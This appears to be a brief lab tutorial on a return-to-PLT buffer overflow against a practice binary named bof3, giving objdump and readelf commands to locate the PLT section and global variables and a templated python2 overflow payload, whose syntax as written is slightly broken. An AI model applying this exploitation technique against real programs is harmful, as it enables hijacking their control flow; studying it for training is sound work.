# Buffer Overflow : return to plt
1. TARGET FILE : bof3 <br>
2. SORUCE FILE : bof3.c <br>

***TASK1*** <br>
Q.) How to Find plt section in elf file? <br>
A.) use objdump option with -j ".plt" <br>

How To) <br>
objdump -d -M intel -j .plt bof3 <br>

***TASK2*** <br>
Q.) How to Find global Variable ? <br>
A.) user readelf tool with -s <br>

How To) <br>
readelf -s bof3 |grep GLOBAL <br>

***TASK3*** <br>
Q.) plt Payloads? <br>
A.) Command This <br>

python2 -c "print 'a'*offset '{plt section function address}'+'BBBB'+'{GLOBAL VARIABLE ADDRESS}'" | ./target_file <br>